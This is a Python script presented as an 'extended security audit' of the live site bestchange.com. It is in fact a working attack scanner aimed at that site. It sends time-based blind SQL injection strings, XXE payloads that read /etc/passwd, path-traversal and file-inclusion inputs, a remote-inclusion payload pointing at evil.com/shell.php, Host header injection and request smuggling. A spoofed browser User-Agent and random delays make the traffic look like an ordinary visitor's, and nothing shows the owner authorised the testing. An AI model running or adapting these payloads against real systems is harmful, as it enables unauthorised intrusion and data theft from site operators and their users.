#!/usr/bin/env python3
"""
BestChange.com Extended Security Audit
Deep penetration testing with advanced techniques
"""

import requests
import time
import random
import re
import json
from urllib.parse import quote, urlparse, parse_qs
from datetime import datetime
import threading
import concurrent.futures

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'

class ExtendedAudit:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.discovered_paths = set()
        self.start_time = time.time()
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        self.session.timeout = 15
    
    def random_delay(self, min_sec=0.2, max_sec=0.8):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_finding(self, vuln_type, location, details, severity="MEDIUM"):
        finding = {
            'type': vuln_type,
            'location': location,
            'details': details,
            'severity': severity,
            'timestamp': datetime.now().isoformat()
        }
        self.findings.append(finding)
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW if severity == "MEDIUM" else Colors.CYAN
        print(f"{color}[!] {vuln_type} [{severity}]{Colors.RESET}")
        print(f"    {location}: {details}\n")
    
    def test_advanced_sqli_blind(self):
        """Advanced blind SQL injection testing"""
        print(f"{Colors.BLUE}[*] Testing Advanced Blind SQL Injection...{Colors.RESET}")
        
        # Time-based blind SQLi payloads
        blind_payloads = [
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--",
        ]
        
        endpoints = [
            {'url': f'{self.base_url}/click.php', 'params': {'id': '1', 'from': '10', 'to': '58', 'city': '0'}},
        ]
        
        for endpoint in endpoints:
            for param_name in endpoint['params'].keys():
                for payload in blind_payloads:
                    try:
                        test_params = endpoint['params'].copy()
                        test_params[param_name] = payload
                        
                        start = time.time()
                        response = self.session.get(endpoint['url'], params=test_params, timeout=10)
                        elapsed = time.time() - start
                        self.random_delay()
                        
                        if elapsed > 4:
                            self.log_finding(
                                "Blind SQL Injection (Time-based)",
                                f"{endpoint['url']}?{param_name}",
                                f"Delayed response: {elapsed:.2f}s",
                                "HIGH"
                            )
                    except:
                        continue
    
    def test_xxe_detailed(self):
        """Detailed XXE testing"""
        print(f"{Colors.BLUE}[*] Testing XXE in detail...{Colors.RESET}")
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        ]
        
        xml_endpoints = [
            f'{self.base_url}/api/xml',
            f'{self.base_url}/xml',
            f'{self.base_url}/feed.xml',
            f'{self.base_url}/rss.xml',
        ]
        
        for endpoint in xml_endpoints:
            for payload in xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(endpoint, data=payload, headers=headers, timeout=5)
                    self.random_delay()
                    
                    if 'root:' in response.text or '127.0.0.1' in response.text or 'localhost' in response.text.lower():
                        self.log_finding(
                            "XXE (XML External Entity)",
                            endpoint,
                            "External entity resolved",
                            "HIGH"
                        )
                except:
                    continue
    
    def test_jwt_manipulation(self):
        """Test JWT token manipulation if present"""
        print(f"{Colors.BLUE}[*] Testing JWT tokens...{Colors.RESET}")
        
        try:
            response = self.session.get(f"{self.base_url}/")
            cookies = response.cookies
            
            for cookie in cookies:
                cookie_value = cookie.value
                # Check if it looks like JWT (three parts separated by dots)
                if len(cookie_value.split('.')) == 3:
                    parts = cookie_value.split('.')
                    try:
                        # Try to decode (base64)
                        import base64
                        header = base64.urlsafe_b64decode(parts[0] + '==')
                        payload = base64.urlsafe_b64decode(parts[1] + '==')
                        
                        self.log_finding(
                            "JWT Token Found",
                            "Cookies",
                            f"JWT token detected: {cookie.name}",
                            "INFO"
                        )
                    except:
                        pass
        except:
            pass
    
    def test_graphql(self):
        """Test GraphQL endpoints"""
        print(f"{Colors.BLUE}[*] Testing GraphQL endpoints...{Colors.RESET}")
        
        graphql_endpoints = [
            f'{self.base_url}/graphql',
            f'{self.base_url}/api/graphql',
            f'{self.base_url}/gql',
        ]
        
        graphql_queries = [
            {'query': '{ __schema { types { name } } }'},
            {'query': 'query { __type(name: "User") { name } }'},
        ]
        
        for endpoint in graphql_endpoints:
            for query in graphql_queries:
                try:
                    response = self.session.post(endpoint, json=query, timeout=5)
                    self.random_delay()
                    
                    if response.status_code == 200:
                        if 'errors' in response.text or 'data' in response.text:
                            self.log_finding(
                                "GraphQL Endpoint",
                                endpoint,
                                "GraphQL endpoint accessible",
                                "INFO"
                            )
                except:
                    continue
    
    def test_api_fuzzing(self):
        """Fuzz API endpoints"""
        print(f"{Colors.BLUE}[*] Fuzzing API endpoints...{Colors.RESET}")
        
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/rest', '/rest/api',
            '/v1', '/v2', '/v3', '/api/rates', '/api/exchange',
        ]
        
        fuzz_payloads = [
            '../', '..\\', '....//', '%2e%2e%2f',
            'admin', 'test', 'null', 'undefined',
            'true', 'false', '-1', '0', '999999',
        ]
        
        for path in api_paths:
            for payload in fuzz_payloads[:5]:  # Limit to save time
                try:
                    url = f"{self.base_url}{path}/{payload}"
                    response = self.session.get(url, timeout=5)
                    self.random_delay()
                    
                    if response.status_code in [200, 403]:
                        if 'error' in response.text.lower() and 'stack' in response.text.lower():
                            self.log_finding(
                                "Information Disclosure",
                                url,
                                "Stack trace in error",
                                "MEDIUM"
                            )
                except:
                    continue
    
    def test_websocket(self):
        """Test WebSocket endpoints"""
        print(f"{Colors.BLUE}[*] Testing WebSocket endpoints...{Colors.RESET}")
        
        ws_endpoints = [
            'wss://www.bestchange.com/ws',
            'wss://www.bestchange.com/websocket',
            'wss://www.bestchange.com/socket',
        ]
        
        # Note: WebSocket testing would require websocket library
        # This is a placeholder for manual testing
        for endpoint in ws_endpoints:
            self.log_finding(
                "WebSocket Endpoint (Manual Test Required)",
                endpoint,
                "WebSocket testing requires manual verification",
                "INFO"
            )
    
    def test_file_inclusion(self):
        """Test Local/Remote File Inclusion"""
        print(f"{Colors.BLUE}[*] Testing File Inclusion...{Colors.RESET}")
        
        lfi_payloads = [
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            'php://filter/convert.base64-encode/resource=index.php',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        ]
        
        rfi_payloads = [
            'http://evil.com/shell.php',
            'http://127.0.0.1/test.php',
        ]
        
        include_params = ['file', 'page', 'include', 'path', 'doc', 'document', 'view']
        
        for param in include_params:
            # Test LFI
            for payload in lfi_payloads[:3]:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: payload}, timeout=5)
                    self.random_delay()
                    
                    if 'root:' in response.text or '<?php' in response.text or 'PD9waHA' in response.text:
                        self.log_finding(
                            "Local File Inclusion",
                            f"index.php?{param}",
                            f"File inclusion: {payload}",
                            "HIGH"
                        )
                except:
                    continue
            
            # Test RFI
            for payload in rfi_payloads:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: payload}, timeout=5)
                    self.random_delay()
                    
                    if 'evil.com' in response.text or 'shell' in response.text.lower():
                        self.log_finding(
                            "Remote File Inclusion",
                            f"index.php?{param}",
                            f"Remote inclusion: {payload}",
                            "HIGH"
                        )
                except:
                    continue
    
    def test_http_smuggling(self):
        """Test HTTP Request Smuggling"""
        print(f"{Colors.BLUE}[*] Testing HTTP Request Smuggling...{Colors.RESET}")
        
        smuggling_payloads = [
            'POST / HTTP/1.1\r\nHost: www.bestchange.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED',
        ]
        
        # This requires raw socket connections - simplified test
        try:
            url = f"{self.base_url}/"
            # Test with conflicting headers
            headers = {
                'Content-Length': '13',
                'Transfer-Encoding': 'chunked',
            }
            response = self.session.post(url, headers=headers, data='test', timeout=5)
            self.random_delay()
            
            # Check for unusual responses
            if response.status_code not in [200, 400, 411]:
                self.log_finding(
                    "Potential HTTP Smuggling",
                    url,
                    f"Unusual status: {response.status_code}",
                    "MEDIUM"
                )
        except:
            pass
    
    def test_host_header_injection(self):
        """Test Host header injection"""
        print(f"{Colors.BLUE}[*] Testing Host Header Injection...{Colors.RESET}")
        
        host_payloads = [
            'evil.com',
            'evil.com:80',
            'bestchange.com.evil.com',
            'bestchange.com@evil.com',
        ]
        
        for payload in host_payloads:
            try:
                headers = {'Host': payload}
                response = self.session.get(f"{self.base_url}/", headers=headers, timeout=5)
                self.random_delay()
                
                if payload in response.text or 'evil.com' in response.text:
                    self.log_finding(
                        "Host Header Injection",
                        "HTTP Headers",
                        f"Host header reflected: {payload}",
                        "MEDIUM"
                    )
            except:
                continue
    
    def test_prototype_pollution(self):
        """Test Prototype Pollution"""
        print(f"{Colors.BLUE}[*] Testing Prototype Pollution...{Colors.RESET}")
        
        proto_payloads = [
            {'__proto__': {'isAdmin': True}},
            {'constructor': {'prototype': {'isAdmin': True}}},
        ]
        
        json_endpoints = [
            f'{self.base_url}/api',
            f'{self.base_url}/api/rates',
        ]
        
        for endpoint in json_endpoints:
            for payload in proto_payloads:
                try:
                    response = self.session.post(endpoint, json=payload, timeout=5)
                    self.random_delay()
                    
                    if 'isAdmin' in response.text or 'true' in response.text.lower():
                        self.log_finding(
                            "Potential Prototype Pollution",
                            endpoint,
                            "Prototype pollution payload processed",
                            "HIGH"
                        )
                except:
                    continue
    
    def generate_report(self):
        """Generate report"""
        elapsed = time.time() - self.start_time
        
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}EXTENDED AUDIT REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}Duration: {elapsed:.2f} seconds{Colors.RESET}\n")
        
        if not self.findings:
            print(f"{Colors.GREEN}[+] No additional vulnerabilities found{Colors.RESET}")
        else:
            high = [f for f in self.findings if f['severity'] == 'HIGH']
            medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
            info = [f for f in self.findings if f['severity'] == 'INFO']
            
            print(f"{Colors.RED}[!] Found {len(self.findings)} finding(s){Colors.RESET}")
            print(f"  HIGH: {len(high)}, MEDIUM: {len(medium)}, INFO: {len(info)}\n")
            
            for finding in self.findings:
                color = Colors.RED if finding['severity'] == 'HIGH' else Colors.YELLOW if finding['severity'] == 'MEDIUM' else Colors.CYAN
                print(f"{color}[{finding['severity']}] {finding['type']}{Colors.RESET}")
                print(f"    {finding['location']}: {finding['details']}\n")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Extended Security Audit{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    auditor = ExtendedAudit()
    
    try:
        auditor.test_advanced_sqli_blind()
        auditor.test_xxe_detailed()
        auditor.test_jwt_manipulation()
        auditor.test_graphql()
        auditor.test_api_fuzzing()
        auditor.test_file_inclusion()
        auditor.test_http_smuggling()
        auditor.test_host_header_injection()
        auditor.test_prototype_pollution()
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
    
    auditor.generate_report()

if __name__ == "__main__":
    main()
